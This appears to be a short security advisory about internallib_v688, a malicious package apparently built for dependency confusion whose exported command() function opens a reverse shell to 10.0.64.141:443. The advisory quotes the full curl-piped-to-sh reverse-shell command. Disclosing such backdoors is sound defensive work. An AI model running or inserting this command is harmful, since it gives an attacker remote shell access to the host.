summary: Reverse shell backdoor to 10.0.64.141:443 in exported command()
details: internallib_v688 exports a function command() that runs `/bin/bash -c "curl https://reverse-shell.sh/10.0.64.141:<port>|sh"`, fetching a reverse-shell script from reverse-shell.sh and piping it to a shell that connects back to 10.0.64.141:443. Any consumer invoking internallib.command() grants the operator of that IP interactive shell access on the host. The package name follows an internal-library shape and declares itself as its own dependency, consistent with a dependency-confusion attack artifact targeting internal namespaces.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
